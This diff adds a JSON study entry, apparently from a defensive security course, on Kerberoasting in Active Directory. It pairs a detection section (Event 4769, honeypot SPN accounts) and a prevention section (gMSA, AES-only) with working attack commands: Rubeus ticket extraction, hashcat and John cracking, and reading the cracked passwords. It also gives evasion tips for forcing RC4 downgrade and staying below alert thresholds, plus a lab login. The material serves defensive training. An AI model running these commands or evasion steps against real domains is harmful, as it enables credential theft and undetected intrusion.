@@ -1,0 +1,85 @@
+{
+  "id": "cdsa-m06-kerberoasting",
+  "name": "Kerberoasting \u2014 Attack, Detection & Defense",
+  "command": ".\\Rubeus.exe kerberoast /outfile:spn.txt",
+  "description": "Kerberoasting extracts Kerberos TGS tickets for accounts with SPNs and cracks them offline. Detection: Event 4769 with RC4 encryption type, or bulk ticket requests from a single source. Prevention: strong passwords (100+chars), GMSA accounts, disable RC4.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory Defense",
+  "subcategory": "Kerberos Attacks",
+  "certifications": [
+    "CDSA"
+  ],
+  "source": "CDSA Module 06: Windows Attacks & Defense",
+  "tags": [
+    "kerberoasting",
+    "kerberos",
+    "tgs",
+    "spn",
+    "rubeus",
+    "hashcat",
+    "active-directory",
+    "blue-team"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "notes": "Lab: RDP as bob/Slavi123 to WS001 (<TARGET_IP>)\nDomain: eagle.local | DC1: <DC1_IP> | DC2: <DC2_IP> | WS001: <WS001_IP> | Kali: <KALI_IP>\n\n=== ATTACK ===\n# Step 1: Extract all Kerberoastable TGS tickets (WS001 PS)\n.\\Rubeus.exe kerberoast /outfile:spn.txt\n  \u2192 Targets all users with SPN registered (excluding krbtgt and disabled accounts)\n  \u2192 Tickets written to spn.txt\n  \u2192 Note: if account supports AES, Rubeus will extract AES ticket by default\n  \u2192       Add /rc4opsec or /tgtdeleg to force downgrade to RC4\n\n# Step 2: Transfer spn.txt to Kali, then crack\nhashcat -m 13100 -a 0 spn.txt passwords.txt --outfile=\"cracked.txt\"\n  \u2192 13100 = Kerberos 5, etype 23 (RC4), TGS-REP\n  \u2192 Append --force if hashcat errors on VM\n\n# Alternative: John the Ripper\nsudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot\n\n=== DETECTION ===\nEvent ID 4769: Kerberos Service Ticket Requested\n  \u2192 High volume by default \u2014 filter for:\n    (a) RC4 encryption type (Ticket Encryption Type 0x17) when AES is enforced env-wide\n    (b) >10 tickets from same source IP/user within 1 minute (bulk extraction)\n  \u2192 Alert on tickets for honeypot SPN accounts (any request = malicious)\n\nHoneypot SPN user criteria:\n  \u2192 Old account (2+ years), old password, privileged-looking name\n  \u2192 Must have SPN registered (IIS/SQL looks legitimate)\n  \u2192 Any 4769 for this account = alert\n\n=== PREVENTION ===\n  \u2192 100+ character random passwords for SPN accounts (127 max in AD)\n  \u2192 Use Group Managed Service Accounts (GMSA) where supported\n  \u2192 Disable RC4 where all apps support AES\n  \u2192 Audit and remove unused SPNs regularly",
+  "examples": [
+    {
+      "label": "Extract all Kerberoastable tickets (Rubeus)",
+      "command": ".\\Rubeus.exe kerberoast /outfile:spn.txt"
+    },
+    {
+      "label": "Crack TGS hashes with hashcat (RC4/etype23)",
+      "command": "hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile=\"cracked.txt\""
+    },
+    {
+      "label": "Crack TGS hashes with John",
+      "command": "sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot"
+    },
+    {
+      "label": "Read cracked passwords",
+      "command": "cat cracked.txt"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Windows Attacks & Defense",
+      "url": "https://academy.hackthebox.com/module/details/176"
+    },
+    {
+      "title": "Microsoft - Group Managed Service Accounts Overview",
+      "url": "https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m06-asreproasting",
+      "rel": "next",
+      "note": "Similar attack targeting accounts with Kerberos pre-auth disabled."
+    },
+    {
+      "id": "cdsa-m06-dcsync",
+      "rel": "next",
+      "note": "Once service account password cracked, DCSync may be possible with replication rights."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Any authenticated domain user can request a TGS ticket for any account that has an SPN registered. The ticket is encrypted with the service account's password hash, so it can be extracted and cracked offline \u2014 no elevated rights are needed and the cracking never touches the network.",
+    "prerequisites": "Any valid domain user account, and a target account with an SPN registered (krbtgt and disabled accounts are excluded).",
+    "impact": "The cleartext password of the SPN/service account after offline cracking. If that account is privileged (or reused elsewhere), this becomes a direct path to escalation or lateral movement.",
+    "detection": "Event 4769 (Kerberos Service Ticket Requested). It is high-volume by default, so filter for: (a) RC4 encryption type (0x17) when AES is enforced environment-wide, and (b) more than ~10 tickets from one source IP/user within a minute (bulk extraction). Any 4769 for a honeypot SPN account is malicious by definition.",
+    "artifacts": "4769 events on the DC; an spn.txt (or equivalent) hash dump on the attacker host; Rubeus.exe execution. A honeypot SPN account (old account, old password, privileged-looking name, IIS/SQL-style SPN) fires 4769 on any request.",
+    "prevention": "Use 100+ character random passwords for SPN accounts (127 max in AD); prefer Group Managed Service Accounts (gMSA); disable RC4 where every app supports AES; audit and remove unused SPNs regularly.",
+    "evasion": "Rubeus can force an RC4 downgrade (/rc4opsec, /tgtdeleg) to obtain crackable tickets even where AES is preferred; requesting a single ticket at a time stays below the bulk-volume alert threshold.",
+    "sources": [
+      "HTB CDSA M06",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords \u2014 or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state \u2014 password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket \u2014 short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 \u2014 Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 \u2014 For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 \u2014 Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+  }
+}
